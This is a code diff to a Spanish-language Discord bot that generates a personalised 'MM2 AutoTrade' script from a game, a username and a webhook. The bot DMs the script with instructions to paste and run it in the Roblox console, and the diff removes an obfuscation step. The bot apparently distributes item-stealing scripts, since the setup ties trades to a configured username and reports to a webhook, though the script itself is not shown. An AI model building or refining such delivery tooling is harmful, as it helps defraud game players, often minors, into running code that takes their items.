@@ -143,13 +143,6 @@ client.on('interactionCreate', async (interaction) => {
           // Generar script personalizado
           const script = await generateScript(game, username, webhook);
 
-          // Ofuscar el script
-          const obfuscated = JavaScriptObfuscator.obfuscate(script, {
-            compact: true,
-            controlFlowFlattening: false,
-            unicodeEscapeSequence: false,
-          }).getObfuscatedCode();
-
           // Enviar DM al usuario
           try {
             const dmChannel = await interaction.user.createDM();
@@ -157,13 +150,13 @@ client.on('interactionCreate', async (interaction) => {
             // Dividir el script en partes si es muy largo
             const maxLength = 1950;
             const parts = [];
-            for (let i = 0; i < obfuscated.length; i += maxLength) {
-              parts.push(obfuscated.substring(i, i + maxLength));
+            for (let i = 0; i < script.length; i += maxLength) {
+              parts.push(script.substring(i, i + maxLength));
             }
 
             const embed = new EmbedBuilder()
               .setColor(Colors.Green)
-              .setTitle('🔪 Tu Script MM2 AutoTrade - Ofuscado')
+              .setTitle('🔪 Tu Script MM2 AutoTrade')
               .setDescription('Tu script está listo. Cópialo y ejecuta en tu consola de Roblox (F9)')
               .addFields(
                 { name: '👤 Usuario Configurado', value: `\`${username}\``, inline: true },
@@ -173,7 +166,7 @@ client.on('interactionCreate', async (interaction) => {
                   value: '1. Abre Roblox\n2. Entra en Murder Mystery 2\n3. Abre consola (F9)\n4. Copia y pega todo el script\n5. Presiona Enter',
                 }
               )
-              .setFooter({ text: 'AutoTrade MM2 | Script ofuscado' })
+              .setFooter({ text: 'AutoTrade MM2 | Script personalizado' })
               .setTimestamp();
 
             await dmChannel.send({ embeds: [embed] });
